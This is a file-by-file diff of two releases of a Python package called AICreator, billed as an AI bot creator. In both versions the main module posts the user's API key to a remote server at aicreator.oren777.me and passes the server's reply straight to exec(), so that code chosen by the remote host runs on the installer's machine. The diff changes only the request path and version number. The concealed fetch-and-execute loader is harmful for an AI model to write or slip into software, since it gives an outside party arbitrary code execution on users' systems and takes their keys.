# Comparing `tmp/AICreator-0.1.2.tar.gz` & `tmp/AICreator-0.1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "AICreator-0.1.2.tar", last modified: Thu May  4 17:30:04 2023, max compression
+gzip compressed data, was "AICreator-0.1.3.tar", last modified: Fri May 12 10:52:23 2023, max compression
```

## Comparing `AICreator-0.1.2.tar` & `AICreator-0.1.3.tar`

### file list

```diff
@@ -1,19 +1,19 @@
-drwxrwxrwx   0        0        0        0 2023-05-04 17:30:04.424196 AICreator-0.1.2/
-drwxrwxrwx   0        0        0        0 2023-05-04 17:30:04.418190 AICreator-0.1.2/AICreator.egg-info/
--rw-rw-rw-   0        0        0      559 2023-05-04 17:30:04.000000 AICreator-0.1.2/AICreator.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      334 2023-05-04 17:30:04.000000 AICreator-0.1.2/AICreator.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-04 17:30:04.000000 AICreator-0.1.2/AICreator.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-04 17:30:04.000000 AICreator-0.1.2/AICreator.egg-info/requires.txt
--rw-rw-rw-   0        0        0       17 2023-05-04 17:30:04.000000 AICreator-0.1.2/AICreator.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-05-04 17:30:04.419196 AICreator-0.1.2/AICreatorPackage/
--rw-rw-rw-   0        0        0      156 2023-05-02 13:30:46.000000 AICreator-0.1.2/AICreatorPackage/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-04 17:30:04.422196 AICreator-0.1.2/AICreatorPackage/functions/
--rw-rw-rw-   0        0        0      818 2023-05-04 17:28:20.000000 AICreator-0.1.2/AICreatorPackage/functions/AICreatorPackage.py
--rw-rw-rw-   0        0        0        0 2022-04-25 10:59:44.000000 AICreator-0.1.2/AICreatorPackage/functions/__init__.py
--rw-rw-rw-   0        0        0     1078 2022-04-24 17:23:55.000000 AICreator-0.1.2/LICENCE.txt
--rw-rw-rw-   0        0        0       25 2021-08-13 08:55:17.000000 AICreator-0.1.2/MANIFEST.in
--rw-rw-rw-   0        0        0      559 2023-05-04 17:30:04.423198 AICreator-0.1.2/PKG-INFO
--rw-rw-rw-   0        0        0       73 2023-05-02 12:11:18.000000 AICreator-0.1.2/README.txt
--rw-rw-rw-   0        0        0        0 2022-04-24 17:21:54.000000 AICreator-0.1.2/__init__.py
--rw-rw-rw-   0        0        0       42 2023-05-04 17:30:04.424196 AICreator-0.1.2/setup.cfg
--rw-rw-rw-   0        0        0      675 2023-05-04 17:29:15.000000 AICreator-0.1.2/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-12 10:52:23.006608 AICreator-0.1.3/
+drwxrwxrwx   0        0        0        0 2023-05-12 10:52:22.995759 AICreator-0.1.3/AICreator.egg-info/
+-rw-rw-rw-   0        0        0      559 2023-05-12 10:52:22.000000 AICreator-0.1.3/AICreator.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      334 2023-05-12 10:52:22.000000 AICreator-0.1.3/AICreator.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-12 10:52:22.000000 AICreator-0.1.3/AICreator.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-12 10:52:22.000000 AICreator-0.1.3/AICreator.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       17 2023-05-12 10:52:22.000000 AICreator-0.1.3/AICreator.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-12 10:52:22.997275 AICreator-0.1.3/AICreatorPackage/
+-rw-rw-rw-   0        0        0      156 2023-05-02 13:30:46.000000 AICreator-0.1.3/AICreatorPackage/__init__.py
+drwxrwxrwx   0        0        0        0 2023-05-12 10:52:23.002574 AICreator-0.1.3/AICreatorPackage/functions/
+-rw-rw-rw-   0        0        0      831 2023-05-12 10:48:35.000000 AICreator-0.1.3/AICreatorPackage/functions/AICreatorPackage.py
+-rw-rw-rw-   0        0        0        0 2022-04-25 10:59:44.000000 AICreator-0.1.3/AICreatorPackage/functions/__init__.py
+-rw-rw-rw-   0        0        0     1078 2022-04-24 17:23:55.000000 AICreator-0.1.3/LICENCE.txt
+-rw-rw-rw-   0        0        0       25 2021-08-13 08:55:17.000000 AICreator-0.1.3/MANIFEST.in
+-rw-rw-rw-   0        0        0      559 2023-05-12 10:52:23.005092 AICreator-0.1.3/PKG-INFO
+-rw-rw-rw-   0        0        0       73 2023-05-02 12:11:18.000000 AICreator-0.1.3/README.txt
+-rw-rw-rw-   0        0        0        0 2022-04-24 17:21:54.000000 AICreator-0.1.3/__init__.py
+-rw-rw-rw-   0        0        0       42 2023-05-12 10:52:23.006608 AICreator-0.1.3/setup.cfg
+-rw-rw-rw-   0        0        0      675 2023-05-12 10:51:55.000000 AICreator-0.1.3/setup.py
```

### Comparing `AICreator-0.1.2/AICreatorPackage/functions/AICreatorPackage.py` & `AICreator-0.1.3/AICreatorPackage/functions/AICreatorPackage.py`

 * *Files 12% similar despite different names*

```diff
@@ -12,30 +12,30 @@
 
 
 
 
 def AICreatorDiscordBot(apiKEY):
     print("[+] AICreator (By Oren) Is Ready!")
 
-    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/discordbot/{apiKEY}/')
+    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/discordbot/apiKey/{apiKEY}')
 
     cc1 = cc.json()
 
     try:
         exec(cc1['c'])
     except:
         print("error, please contact support.")
 
 
 
 
 def AICreatorWebsiteBot(apiKEY):
     print("[+] AICreator (By Oren) Is Ready!")
 
-    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/websitebot/{apiKEY}/')
+    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/websitebot/apiKey/{apiKEY}/')
 
     cc1 = cc.json()
 
     try:
         exec(cc1['c'])
     except:
         print("error, please contact support.")
```

### Comparing `AICreator-0.1.2/LICENCE.txt` & `AICreator-0.1.3/LICENCE.txt`

 * *Files identical despite different names*

### Comparing `AICreator-0.1.2/setup.py` & `AICreator-0.1.3/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -6,15 +6,15 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='AICreator',
-    version='0.1.2',
+    version='0.1.3',
     description='AI Creator Package By - oren',
     long_description=open('README.txt').read(),
     url='',
     author='oren',
     author_email='orennadle@gmail.com',
     license='MIT',
     classifiers=classifiers,
```

